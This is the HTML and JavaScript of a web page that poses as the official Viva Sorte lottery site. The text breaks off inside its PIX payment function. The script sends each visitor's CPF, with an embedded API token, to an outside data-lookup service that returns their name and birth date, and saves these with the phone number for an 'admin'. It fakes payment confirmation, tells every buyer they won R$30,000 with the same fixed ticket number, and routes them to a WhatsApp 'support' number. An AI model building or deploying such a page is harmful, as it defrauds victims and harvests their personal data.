<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Viva Sorte</title>
    
    <!-- CSS -->
    <link href="css/style.css" rel="stylesheet">
    <link href="css/rodape.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
    <link rel="stylesheet" href="css/bootstrap-icons.min.css">
    
    <!-- CSS DAS ETAPAS COMPLETAS -->
    <style>
    /* [MANTENHA TODO O SEU CSS ATUAL AQUI - N√ÉO ALTERE] */
    /* MODAL DE PAGAMENTO */
    .modal-pagamento {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0,0,0,0.8);
        z-index: 99999;
        align-items: center;
        justify-content: center;
        padding: 15px;
    }
    
    /* ... TODO O RESTANTE DO SEU CSS ... */
    
    </style>
</head>
<body>
    <!-- HEADER -->
    <header class="white-header">
        <div class="logo">
            <img src="images/logoviva.png" alt="Logomarca" class="logoviva">
        </div>
        <button class="menu-button" id="menuButton">HOJE</button>
    </header>

    <!-- BANNER -->
    <div class="banner">
        <div class="container-banner">
            <div id="carouselExampleSlidesOnly" class="carousel slide" data-bs-ride="carousel">
                <div class="carousel-inner">
                    <div class="carousel-item active">
                        <div class="tag-compre-agora"><span>Site Oficial</span></div>
                        <img src="images/1m1.jpg" class="d-block w-100" alt="...">
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- T√çTULO -->
    <div class="sorteio-date w-100 text-center">
        <h1>Sorteio <span style="background-color: #f0ad4e;" id="contador">HOJE</span> por apenas <span style="background-color: #2f4eb5;">R$0,99</span></h1>
    </div>

    <!-- PACOTES DE COTAS -->
    <div class="container-principal">
        <div class="cotas">
            <div class="cotas-one">
                <button type="button" class="cota" onclick="selecionarPacote(6, 5.94)">
                    <div class="cota-qtd">+6</div>
                    <h1>R$5,94</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(10, 9.90)">
                    <div class="cota-qtd">+10</div>
                    <h1>R$9,90</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(15, 14.85)">
                    <div class="cota-qtd">+15</div>
                    <h1>R$14,85</h1>
                    <h2>SELECIONAR</h2>
                </button>
            </div>
            
            <div class="cotas-one">
                <button type="button" class="cota" onclick="selecionarPacote(20, 19.85)">
                    <div class="cota-qtd">+20</div>
                    <h1>R$19,85</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(30, 29.70)">
                    <div class="cota-qtd">+30</div>
                    <h1>R$29,70</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(40, 39.60)">
                    <div class="cota-qtd">+40</div>
                    <h1>R$39,60</h1>
                    <h2>SELECIONAR</h2>
                </button>
            </div>
            
            <div class="cotas-one">
                <button type="button" class="cota" onclick="selecionarPacote(70, 69.30)">
                    <i class="bi bi-star-fill destaque"></i>
                    <div class="cota-qtd">+70</div>
                    <h1>R$69,30</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(100, 99.00)">
                    <div class="cota-qtd">+100</div>
                    <h1>R$99,00</h1>
                    <h2>SELECIONAR</h2>
                </button>
                <button type="button" class="cota" onclick="selecionarPacote(200, 199.00)">
                    <div class="cota-qtd">+200</div>
                    <h1>R$199,00</h1>
                    <h2>SELECIONAR</h2>
                </button>
            </div>
        </div>
    </div>

    <!-- CONTADOR PERSONALIZADO -->
    <div class="container-principal">
        <div class="contador-cotas">
            <span><button type="button" class="btn-contador-cotas" onclick="decrementar()">-</button></span>
            <input type="number" id="numero" class="input-contador-cotas" value="0" min="0">
            <span><button type="button" class="btn-contador-cotas" onclick="incrementar()">+</button></span>
        </div>
        
        <button type="button" id="btn-adicionar-carrinho" class="adc-carrinho" onclick="comprarTitulosCustom()" disabled>
            <i class="bi bi-cart-fill"></i> COMPRAR T√çTULOS
        </button>
    </div>

    <!-- MENSAGEM -->
    <div class="container-principal">
        <div class="sorteio-date w-100 text-center" style="margin-top: 5px;">
            <br>
            <h1 style="font-size: 0.72rem;">Comprar mais t√≠tulos aumenta suas chances de ganhar!</h1>
        </div>
    </div>

    <!-- HOSPITAL -->
    <div class="container-principal">
        <div class="hospital">
            <div class="card-hospital">
                <div class="card-hospital-image">
                    <img src="images/logo-hospital.svg">
                    <h2>Institui√ß√£o beneficiada</h2>
                </div>
                <div class="card-hospital-text">
                    <p>O Hospital do C√¢ncer de Londrina...</p>
                </div>
            </div>
            
            <div class="card-hospital card-hospital-bg-azul">
                <div class="card-hospital-image">
                    <img src="images/viva-hosp.svg">
                    <h2>Viva Privil√©gios</h2>
                </div>
                <div class="card-hospital-text">
                    <p>Viva Privil√©gios, um programa que enriquece sua vida...</p>
                </div>
            </div>
        </div>
    </div>

    <!-- RODAP√â -->
    <div class="rodape">
        <div class="container-principal">
            <img class="logo-rodape" src="images/logoviva.png">
            <div class="redes">
                <i class="bi bi-instagram"></i>
                <i class="bi bi-facebook"></i>
                <i class="bi bi-twitter"></i>
                <i class="bi bi-youtube"></i>
            </div>
            <h1>Sorteios lastreados por T√≠tulos de Capitaliza√ß√£o...</h1>
            <div class="linha-rodape"></div>
            <div class="patterns-rodape">
                <div class="pattern-rodape">T√≠tulos emitidos por: <img src="images/viacap.png"></div>
                <div class="pattern-rodape">Promo√ß√£o realizada por: <img src="images/viva.png"></div>
                <div class="pattern-rodape">Desenvolvimento: <img src="images/edjdigital.png"></div>
            </div>
        </div>
    </div>

    <!-- MODAL DE PAGAMENTO COM 4 ETAPAS -->
    <div id="modalPagamento" class="modal-pagamento">
        <div class="modal-conteudo">
            <button class="btn-fechar-modal" onclick="fecharModal()">√ó</button>
            
            <!-- ETAPA 1: IDENTIFICA√á√ÉO (CPF) -->
            <div id="etapa1" class="etapa ativa">
                <div class="modal-header">
                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
                </div>
                
                <div class="progresso-etapas">
                    <div class="etapa-item ativa">
                        <div class="etapa-numero">1</div>
                        <div class="etapa-nome">Identifica√ß√£o</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">2</div>
                        <div class="etapa-nome">Pagamento</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">3</div>
                        <div class="etapa-nome">Confirma√ß√£o</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">4</div>
                        <div class="etapa-nome">Conclu√≠do</div>
                    </div>
                </div>
                
                <div class="modal-body">
                    <h2>Ol√°, boas vindas!</h2>
                    <p>Identifique-se usando seu CPF</p>
                    <div class="resumo-compra" id="resumoCompra">6 t√≠tulos - R$5,94</div>
                    
                    <div class="form-group">
                        <label>CPF</label>
                        <input type="text" id="inputCPF" placeholder="Digite o seu CPF" maxlength="14">
                        <div class="exemplo-input">Exemplo: 123.456.789-09</div>
                        <div id="erroCPF" class="mensagem-erro"></div>
                    </div>
                    
                    <div id="sucessoCPF" class="mensagem-sucesso" style="display: none;">
                        <i class="bi bi-check-circle-fill"></i>
                        Identifica√ß√£o realizada com sucesso!
                        <div style="font-size: 12px; margin-top: 5px;">CPF: <span id="cpfExibido"></span> - Cadastro identificado</div>
                    </div>
                    
                    <button id="btnContinuarCPF" class="btn-principal" onclick="validarCPFeAvancar()" disabled>
                        Continuar
                    </button>
                    
                    <div class="recaptcha-nota">
                        Este site √© protegido pelo Google reCAPTCHA. A Pol√≠tica de Privacidade e os Termos de Servi√ßo da Google se aplicam.
                    </div>
                </div>
            </div>
            
            <!-- ETAPA 2: PAGAMENTO (TELEFONE + PIX) -->
            <div id="etapa2" class="etapa">
                <div class="modal-header">
                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
                </div>
                
                <div class="progresso-etapas">
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Identifica√ß√£o</div>
                    </div>
                    <div class="etapa-item ativa">
                        <div class="etapa-numero">2</div>
                        <div class="etapa-nome">Pagamento</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">3</div>
                        <div class="etapa-nome">Confirma√ß√£o</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">4</div>
                        <div class="etapa-nome">Conclu√≠do</div>
                    </div>
                </div>
                
                <div class="modal-body">
                    <h2>Informe seu telefone</h2>
                    <p>Para contato e confirma√ß√£o do pr√™mio</p>
                    
                    <div class="form-group">
                        <label>Telefone (WhatsApp)</label>
                        <input type="tel" id="inputTelefone" placeholder="Ex: (11) 99999-9999" maxlength="20">
                        <div class="exemplo-input">Digite com ou sem o c√≥digo do Brasil (55). Aceitamos qualquer formato!</div>
                        <div id="erroTelefone" class="mensagem-erro"></div>
                    </div>
                    
                    <div class="resumo-pagamento">
                        <h3>Resumo do pagamento</h3>
                        <div class="detalhes-pagamento">
                            <div><span id="quantidadeResumo">6</span> t√≠tulos</div>
                            <div>R$ <span id="valorResumo">5,94</span></div>
                        </div>
                        <div class="total-pagamento">
                            <div>Total</div>
                            <div>R$ <span id="totalResumo">5,94</span></div>
                        </div>
                    </div>
                    
                    <div id="areaPIX" class="area-pix">
                        <div class="qrcode-container">
                            <div id="qrCodeImage"></div>
                            <p style="color: #666; font-size: 13px; margin-top: 10px;">Escaneie o QR Code com seu app banc√°rio</p>
                        </div>
                        
                        <div class="codigo-pix">
                            <p style="color: #333; font-size: 14px; margin-bottom: 8px;">Ou copie o c√≥digo PIX:</p>
                            <div class="input-copiar">
                                <input type="text" id="codigoPIX" readonly style="font-size: 11px;">
                                <button onclick="copiarCodigoPIX()">Copiar</button>
                            </div>
                        </div>
                        
                        <p style="color: #666; font-size: 13px; text-align: center; margin-top: 15px;">
                            Ap√≥s o pagamento, aguarde a confirma√ß√£o autom√°tica
                        </p>
                    </div>
                    
                    <!-- √ÅREA DE AGUARDANDO CONFIRMA√á√ÉO -->
                    <div id="aguardandoConfirmacao" class="aguardando-confirmacao">
                        <div class="rodinha-grande"></div>
                        <div class="aguardando-texto">Aguardando confirma√ß√£o do pagamento</div>
                        <div class="aguardando-detalhes" id="statusAguardando">Verificando se o pagamento foi realizado...</div>
                    </div>
                    
                    <button id="btnGerarPIX" class="btn-principal" onclick="gerarPIX()">
                        Gerar PIX para pagamento
                    </button>
                </div>
            </div>
            
            <!-- ETAPA 3: CONFIRMA√á√ÉO -->
            <div id="etapa3" class="etapa">
                <div class="modal-header">
                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
                </div>
                
                <div class="progresso-etapas">
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Identifica√ß√£o</div>
                    </div>
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Pagamento</div>
                    </div>
                    <div class="etapa-item ativa">
                        <div class="etapa-numero">3</div>
                        <div class="etapa-nome">Confirma√ß√£o</div>
                    </div>
                    <div class="etapa-item">
                        <div class="etapa-numero">4</div>
                        <div class="etapa-nome">Conclu√≠do</div>
                    </div>
                </div>
                
                <div class="modal-body">
                    <div class="confirmacao-sucesso">
                        <div class="icone-confirmacao">‚úÖ</div>
                        <h2 style="color: #155724; margin-bottom: 10px;">Pagamento Confirmado!</h2>
                        <p style="color: #155724;">Seu pagamento de <strong>R$ <span id="valorConfirmado">5,94</span></strong> foi processado com sucesso.</p>
                        <p style="color: #155724; font-size: 12px; margin-top: 10px;" id="confirmacaoDetalhes">
                            Transa√ß√£o ID: <span id="transacaoId"></span>
                        </p>
                    </div>
                    
                    <!-- NOVO DESIGN MAIS CLEAN -->
                    <div class="anuncio-premio-clean">
                        <div class="icone-premio">
                            <i class="bi bi-gift-fill"></i>
                        </div>
                        <h3>Parab√©ns!</h3>
                        <p class="texto-premio">Voc√™ est√° participando do sorteio instant√¢neo <strong>VIVA SORTE</strong></p>
                        <p class="subtitulo-premio">Clique no bot√£o abaixo para revelar seu pr√™mio</p>
                    </div>
                    
                    <button class="btn-premio btn-premio-clean" onclick="avancarParaEtapa4()">
                        <i class="bi bi-sparkles"></i>
                        REVELAR PR√äMIO INSTANT√ÇNEO
                        <i class="bi bi-arrow-right"></i>
                    </button>
                </div>
            </div>
            
            <!-- ETAPA 4: NOVO PR√äMIO COM IMAGEM OTIMIZADA -->
            <div id="etapa4" class="etapa">
                <div class="modal-header">
                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
                </div>
                
                <div class="progresso-etapas">
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Identifica√ß√£o</div>
                    </div>
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Pagamento</div>
                    </div>
                    <div class="etapa-item completada">
                        <div class="etapa-numero">‚úì</div>
                        <div class="etapa-nome">Confirma√ß√£o</div>
                    </div>
                    <div class="etapa-item ativa">
                        <div class="etapa-numero">4</div>
                        <div class="etapa-nome">Conclu√≠do</div>
                    </div>
                </div>
                
                <div class="modal-body">
                    <!-- TEXTO CHAMATIVO ACIMA DA IMAGEM -->
                    <div class="texto-chamativo-premio">
                        üéâ PARAB√âNS! VOC√ä GANHOU R$30.000,00! üéâ
                    </div>
                    
                    <!-- CART√ÉO DE PR√äMIO COM IMAGEM OTIMIZADA -->
                    <div class="premio-ganho">
                        <div class="imagem-premio">
                            <!-- IMAGEM OTIMIZADA DO LINK -->
                            <img src="https://i.postimg.cc/BXbd1TCW/image.png" 
                                 alt="Parab√©ns! Pr√™mio de R$ 30.000,00"
                                 onerror="this.onerror=null; this.src='images/fallback-premio.png';">
                        </div>
                        
                        <!-- NOVA LINHA ADICIONADA COM A INFORMA√á√ÉO DA COTA PREMIADA -->
                        <div style="background: #2f4eb5; color: white; padding: 12px 15px; border-radius: 8px; margin: 15px 0; text-align: center; font-weight: 600; font-size: 16px;">
                            <i class="bi bi-ticket-perforated-fill" style="margin-right: 8px;"></i>
                            VOC√ä ACHOU A COTA PREMIADA <strong>#202530000</strong> E GANHOU <strong>30 MIL REAIS</strong>!
                        </div>
                        
                        <div class="badge-pagamento-rapido">
                            <i class="bi bi-lightning-charge-fill"></i> PAGAMENTO NA HORA
                        </div>
                    </div>
                    
                    <!-- PASSOS DO PR√äMIO - ATUALIZADO -->
                    <div class="passos-premio">
                        <h3><i class="bi bi-gift-fill"></i> Pr√≥ximos Passos para Receber seu Pr√™mio:</h3>
                        <ul>
                            <li><span class="bi bi-ticket-perforated"></span> Cota premiada: <strong>#202530000</strong></li>
                            <li><span class="bi bi-cash-coin"></span> Valor do pr√™mio: <strong>R$ 30.000,00</strong></li>
                            <li><span class="bi bi-telephone"></span> Nossa equipe entrar√° em contato no telefone cadastrado</li>
                            <li><span class="bi bi-lightning-charge"></span> Pagamento realizado na hora</li>
                        </ul>
                    </div>
                    
                    <!-- BOT√ÉO √öNICO DE SUPORTE - AZUL DO LAYOUT -->
                    <button class="btn-suporte-final" onclick="abrirSuporteWhatsApp()">
                        <i class="bi bi-whatsapp"></i>
                        FALAR COM SUPORTE PARA RECEBER MEUS R$30.000,00
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- POPUPS DE NOTIFICA√á√ÉO -->
    <div class="popup" id="popup"></div>
    <audio id="notifySound" preload="auto">
        <source src="media/beep-07.wav" type="audio/wav">
    </audio>

    <!-- SCRIPTS -->
    <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
    
    <!-- SCRIPT PRINCIPAL MODIFICADO -->
    <script>
    // VARI√ÅVEIS GLOBAIS
    let pacoteSelecionado = {
        quantidade: 6,
        valor: 5.94
    };
    
    let dadosUsuario = {
        cpf: '',
        telefone: '',
        transactionId: '',
        pixData: null,
        apiData: null // Adicionado para armazenar dados da API
    };

    // CONFIGURA√á√ÉO ALLOW PAY
    const ALLOWPAY_CONFIG = {
        API_URL: '/api/allowpay',
        CHECK_PAYMENT_URL: '/api/check-payment',
        CHECK_CONFIRMED_URL: '/api/check-confirmed'
    };

    // FUN√á√ÉO PARA BUSCAR DADOS DA API DE CPF
    async function buscarDadosCPF(cpf) {
        try {
            console.log('üîç Buscando dados do CPF:', cpf);
            const url = `https://api.amnesiatecnologia.rocks/?token=4c80cd47-d9d5-4672-a301-b9b8741fc293&cpf=${cpf}`;
            const res = await fetch(url);
            const data = await res.json();
            
            console.log('üìä Dados retornados da API:', data);
            
            // Calcular idade a partir da data de nascimento
            let idade = 'N√£o encontrada';
            if (data.DADOS?.NASCIMENTO) {
                const nascimento = new Date(data.DADOS.NASCIMENTO);
                const hoje = new Date();
                idade = hoje.getFullYear() - nascimento.getFullYear();
                const mes = hoje.getMonth() - nascimento.getMonth();
                if (mes < 0 || (mes === 0 && hoje.getDate() < nascimento.getDate())) {
                    idade--;
                }
            }
            
            // Formatar data de nascimento
            let nascimentoFormatado = 'N√£o encontrada';
            if (data.DADOS?.NASCIMENTO) {
                const dataNasc = new Date(data.DADOS.NASCIMENTO);
                nascimentoFormatado = dataNasc.toLocaleDateString('pt-BR');
            }
            
            // Salvar dados no localStorage para o admin
            const adminData = {
                cpf: cpf,
                nome: data.DADOS?.NOME || 'N√£o encontrado',
                nascimento: nascimentoFormatado,
                idade: idade,
                telefone: 'Aguardando...',
                cota: '202530000',
                dataConsulta: new Date().toLocaleString('pt-BR'),
                dadosCompletos: data.DADOS || {}
            };
            
            console.log('üíæ Salvando dados para admin:', adminData);
            localStorage.setItem('adminData', JSON.stringify(adminData));
            
            // Retornar dados para usar na interface
            return {
                nome: data.DADOS?.NOME || 'N√£o encontrado',
                nascimento: nascimentoFormatado,
                idade: idade,
                dadosCompletos: data.DADOS || {}
            };
            
        } catch (error) {
            console.error('‚ùå Erro ao buscar dados do CPF:', error);
            
            // Salvar dados mesmo em caso de erro
            const adminData = {
                cpf: cpf,
                nome: 'Erro na consulta',
                nascimento: 'Erro na consulta',
                idade: 'Erro na consulta',
                telefone: 'Aguardando...',
                cota: '202530000',
                dataConsulta: new Date().toLocaleString('pt-BR'),
                erro: error.message
            };
            
            localStorage.setItem('adminData', JSON.stringify(adminData));
            
            return {
                nome: 'Erro na consulta',
                nascimento: 'Erro na consulta',
                idade: 'Erro na consulta',
                dadosCompletos: {}
            };
        }
    }

    // FUN√á√ÉO PARA ATUALIZAR DADOS DO ADMIN COM TELEFONE
    function atualizarAdminComTelefone(telefone) {
        try {
            const adminData = JSON.parse(localStorage.getItem('adminData') || '{}');
            adminData.telefone = telefone;
            adminData.dataAtualizacao = new Date().toLocaleString('pt-BR');
            localStorage.setItem('adminData', JSON.stringify(adminData));
            console.log('üì± Telefone salvo para admin:', telefone);
        } catch (error) {
            console.error('‚ùå Erro ao atualizar admin com telefone:', error);
        }
    }

    // FUN√á√ÉO PARA ABRIR SUPORTE NO WHATSAPP
    function abrirSuporteWhatsApp() {
        const whatsappLink = "https://wa.me/5511954268216?text=Ol√°!%20Ganhei%20R$%2030.000,00%20no%20Viva%20Sorte%20e%20gostaria%20de%20receber%20meu%20pr√™mio.";
        window.open(whatsappLink, '_blank', 'noopener,noreferrer');
    }

    // FUN√á√ÉO PARA SELE√á√ÉO DE PACOTE
    function selecionarPacote(quantidade, valor) {
        console.log('Selecionando pacote:', quantidade, valor);
        
        pacoteSelecionado = {
            quantidade: quantidade,
            valor: valor
        };
        
        document.getElementById('numero').value = quantidade;
        document.getElementById('btn-adicionar-carrinho').disabled = false;
        
        document.querySelectorAll('.cota').forEach(btn => {
            btn.classList.remove('cota-selected');
        });
        event.currentTarget.classList.add('cota-selected');
        
        abrirModalPagamento();
    }

    // FUN√á√ïES DO CONTADOR
    function incrementar() {
        let input = document.getElementById('numero');
        let valor = parseInt(input.value) || 0;
        
        if (valor < 200) {
            if (valor === 0) input.value = 6;
            else if (valor === 6) input.value = 10;
            else if (valor === 10) input.value = 15;
            else if (valor === 15) input.value = 20;
            else if (valor === 20) input.value = 30;
            else if (valor === 30) input.value = 40;
            else if (valor === 40) input.value = 70;
            else if (valor === 70) input.value = 100;
            else if (valor === 100) input.value = 200;
        }
        
        atualizarBotaoComprar();
    }

    function decrementar() {
        let input = document.getElementById('numero');
        let valor = parseInt(input.value) || 0;
        
        if (valor > 6) {
            if (valor === 200) input.value = 100;
            else if (valor === 100) input.value = 70;
            else if (valor === 70) input.value = 40;
            else if (valor === 40) input.value = 30;
            else if (valor === 30) input.value = 20;
            else if (valor === 20) input.value = 15;
            else if (valor === 15) input.value = 10;
            else if (valor === 10) input.value = 6;
        } else {
            input.value = 0;
        }
        
        atualizarBotaoComprar();
    }

    function atualizarBotaoComprar() {
        let input = document.getElementById('numero');
        let valor = parseInt(input.value) || 0;
        let btn = document.getElementById('btn-adicionar-carrinho');
        
        if (valor > 0) {
            btn.disabled = false;
            let valorTotal = (valor * 0.99).toFixed(2);
            pacoteSelecionado = {
                quantidade: valor,
                valor: parseFloat(valorTotal)
            };
        } else {
            btn.disabled = true;
        }
    }

    function comprarTitulosCustom() {
        let input = document.getElementById('numero');
        let quantidade = parseInt(input.value) || 0;
        
        if (quantidade > 0) {
            let valorTotal = (quantidade * 0.99).toFixed(2);
            pacoteSelecionado = {
                quantidade: quantidade,
                valor: parseFloat(valorTotal)
            };
            
            abrirModalPagamento();
        }
    }

    // MODAL DE PAGAMENTO
    function abrirModalPagamento() {
        console.log('Abrindo modal, pacote:', pacoteSelecionado);
        
        atualizarResumoCompra();
        mostrarEtapa(1);
        
        document.getElementById('modalPagamento').style.display = 'flex';
        document.body.style.overflow = 'hidden';
        
        setTimeout(() => {
            document.getElementById('inputCPF').focus();
        }, 300);
    }

    function fecharModal() {
        document.getElementById('modalPagamento').style.display = 'none';
        document.body.style.overflow = 'auto';
    }

    function atualizarResumoCompra() {
        document.getElementById('resumoCompra').textContent = 
            pacoteSelecionado.quantidade + ' t√≠tulos - R$' + pacoteSelecionado.valor.toFixed(2).replace('.', ',');
        
        document.getElementById('quantidadeResumo').textContent = pacoteSelecionado.quantidade;
        document.getElementById('valorResumo').textContent = pacoteSelecionado.valor.toFixed(2).replace('.', ',');
        document.getElementById('totalResumo').textContent = pacoteSelecionado.valor.toFixed(2).replace('.', ',');
        document.getElementById('valorConfirmado').textContent = pacoteSelecionado.valor.toFixed(2).replace('.', ',');
    }

    function mostrarEtapa(numeroEtapa) {
        document.querySelectorAll('.etapa').forEach(etapa => {
            etapa.classList.remove('ativa');
        });
        
        document.getElementById('etapa' + numeroEtapa).classList.add('ativa');
        atualizarProgressoEtapas(numeroEtapa);
    }

    function atualizarProgressoEtapas(etapaAtual) {
        document.querySelectorAll('.etapa-item').forEach((item, index) => {
            item.classList.remove('ativa', 'completada');
            
            const numeroItem = index + 1;
            
            if (numeroItem < etapaAtual) {
                item.classList.add('completada');
                item.querySelector('.etapa-numero').textContent = '‚úì';
            } else if (numeroItem === etapaAtual) {
                item.classList.add('ativa');
            }
        });
    }

    // ETAPA 1: VALIDA√á√ÉO DE CPF - MODIFICADA
    document.getElementById('inputCPF').addEventListener('input', function(e) {
        formatarCPF(this);
    });

    function formatarCPF(input) {
        let value = input.value.replace(/\D/g, '');
        
        if (value.length <= 11) {
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d)/, '$1.$2');
            value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
        }
        
        input.value = value;
        
        const btn = document.getElementById('btnContinuarCPF');
        const cpfNumeros = value.replace(/\D/g, '');
        
        if (cpfNumeros.length === 11) {
            btn.disabled = false;
            btn.style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
        } else {
            btn.disabled = true;
            btn.style.background = '#cccccc';
        }
        
        document.getElementById('erroCPF').style.display = 'none';
        document.getElementById('sucessoCPF').style.display = 'none';
        input.style.borderColor = '#e0e0e0';
    }

    function validarCPF(cpf) {
        cpf = cpf.replace(/\D/g, '');
        
        if (cpf.length !== 11) return false;
        if (/^(\d)\1+$/.test(cpf)) return false;
        
        let soma = 0;
        for (let i = 0; i < 9; i++) {
            soma += parseInt(cpf.charAt(i)) * (10 - i);
        }
        let resto = soma % 11;
        let digito1 = resto < 2 ? 0 : 11 - resto;
        
        if (digito1 !== parseInt(cpf.charAt(9))) return false;
        
        soma = 0;
        for (let i = 0; i < 10; i++) {
            soma += parseInt(cpf.charAt(i)) * (11 - i);
        }
        resto = soma % 11;
        let digito2 = resto < 2 ? 0 : 11 - resto;
        
        return digito2 === parseInt(cpf.charAt(10));
    }

    // FUN√á√ÉO PRINCIPAL MODIFICADA PARA BUSCAR DADOS DA API
    async function validarCPFeAvancar() {
        const cpfInput = document.getElementById('inputCPF');
        const cpf = cpfInput.value;
        const cpfNumeros = cpf.replace(/\D/g, '');
        const erroCPF = document.getElementById('erroCPF');
        const sucessoCPF = document.getElementById('sucessoCPF');
        const cpfExibido = document.getElementById('cpfExibido');
        
        erroCPF.style.display = 'none';
        cpfInput.style.borderColor = '#e0e0e0';
        
        if (cpfNumeros.length !== 11) {
            erroCPF.textContent = 'CPF deve conter 11 d√≠gitos.';
            erroCPF.style.display = 'block';
            cpfInput.style.borderColor = '#e74c3c';
            cpfInput.focus();
            return;
        }
        
        if (!validarCPF(cpf)) {
            erroCPF.textContent = 'CPF inv√°lido. Por favor, verifique o n√∫mero digitado.';
            erroCPF.style.display = 'block';
            cpfInput.style.borderColor = '#e74c3c';
            cpfInput.focus();
            return;
        }
        
        // Armazenar CPF
        dadosUsuario.cpf = cpfNumeros;
        
        // Desabilitar bot√£o e mostrar carregamento
        const btnContinuar = document.getElementById('btnContinuarCPF');
        btnContinuar.innerHTML = '<div class="spinner"></div> Consultando CPF...';
        btnContinuar.disabled = true;
        
        try {
            // Buscar dados da API
            const dadosAPI = await buscarDadosCPF(cpfNumeros);
            dadosUsuario.apiData = dadosAPI;
            
            // Mostrar sucesso
            cpfInput.style.borderColor = '#28a745';
            sucessoCPF.style.display = 'block';
            cpfExibido.textContent = cpf;
            
            // Atualizar bot√£o
            btnContinuar.innerHTML = '‚úÖ Dados encontrados!';
            
            setTimeout(() => {
                mostrarEtapa(2);
                document.getElementById('inputTelefone').focus();
            }, 2000);
            
        } catch (error) {
            console.error('Erro na consulta:', error);
            
            // Mesmo com erro, continuar
            cpfInput.style.borderColor = '#28a745';
            sucessoCPF.style.display = 'block';
            cpfExibido.textContent = cpf;
            
            btnContinuar.innerHTML = '‚úÖ Continuar';
            
            setTimeout(() => {
                mostrarEtapa(2);
                document.getElementById('inputTelefone').focus();
            }, 2000);
        }
    }

    // ETAPA 2: TELEFONE E PIX
    document.getElementById('inputTelefone').addEventListener('input', function(e) {
        formatarTelefoneFlexivel(this);
    });

    function formatarTelefoneFlexivel(input) {
        let value = input.value;
        let digits = value.replace(/\D/g, '');
        
        if (digits.length <= 13) {
            let formatted = '';
            
            if (digits.length <= 2) {
                formatted = digits;
            } else if (digits.length <= 4) {
                formatted = '(' + digits.substring(0, 2) + ') ' + digits.substring(2);
            } else if (digits.length <= 9) {
                formatted = '(' + digits.substring(0, 2) + ') ' + digits.substring(2, 7) + '-' + digits.substring(7);
            } else if (digits.length <= 11) {
                formatted = '(' + digits.substring(0, 2) + ') ' + digits.substring(2, 7) + '-' + digits.substring(7, 11);
            } else {
                formatted = digits;
                if (digits.length === 13 && digits.startsWith('55')) {
                    formatted = '+55 (' + digits.substring(2, 4) + ') ' + digits.substring(4, 9) + '-' + digits.substring(9, 13);
                }
            }
            
            input.value = formatted;
        }
        
        document.getElementById('erroTelefone').style.display = 'none';
        input.style.borderColor = '#e0e0e0';
    }

    function validarTelefone(telefone) {
        const telefoneLimpo = telefone.replace(/\D/g, '');
        const comprimentoValido = telefoneLimpo.length >= 10 && telefoneLimpo.length <= 13;
        
        const dddValido = () => {
            if (telefoneLimpo.length === 10 || telefoneLimpo.length === 11) {
                const ddd = telefoneLimpo.substring(0, 2);
                return ddd >= '11' && ddd <= '99';
            } else if (telefoneLimpo.length === 12 || telefoneLimpo.length === 13) {
                if (!telefoneLimpo.startsWith('55')) return false;
                const ddd = telefoneLimpo.substring(2, 4);
                return ddd >= '11' && ddd <= '99';
            }
            return false;
        };
        
        return comprimentoValido && dddValido();
    }

    function normalizarTelefoneParaEnvio(telefone) {
        return telefone.replace(/\D/g, '');
    }

    // FUN√á√ÉO PARA GERAR PIX - MODIFICADA
    async function gerarPIX() {
        const telefoneInput = document.getElementById('inputTelefone');
        const telefone = telefoneInput.value;
        const telefoneNumeros = normalizarTelefoneParaEnvio(telefone);
        const erroTelefone = document.getElementById('erroTelefone');
        
        if (!validarTelefone(telefone)) {
            let mensagemErro = 'Telefone inv√°lido. Digite um n√∫mero v√°lido com DDD.';
            erroTelefone.textContent = mensagemErro;
            erroTelefone.style.display = 'block';
            telefoneInput.style.borderColor = '#e74c3c';
            telefoneInput.focus();
            return;
        }
        
        // Armazenar telefone
        dadosUsuario.telefone = telefoneNumeros;
        
        // ATUALIZAR DADOS DO ADMIN COM TELEFONE
        atualizarAdminComTelefone(telefoneNumeros);
        
        erroTelefone.style.display = 'none';
        telefoneInput.style.borderColor = '#28a745';
        
        const btnGerarPIX = document.getElementById('btnGerarPIX');
        btnGerarPIX.innerHTML = '<div class="spinner"></div> Gerando PIX...';
        btnGerarPIX.disabled = true;
        
        try {
            // Simular gera√ß√£o de PIX
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            // Gerar QR Code simulado
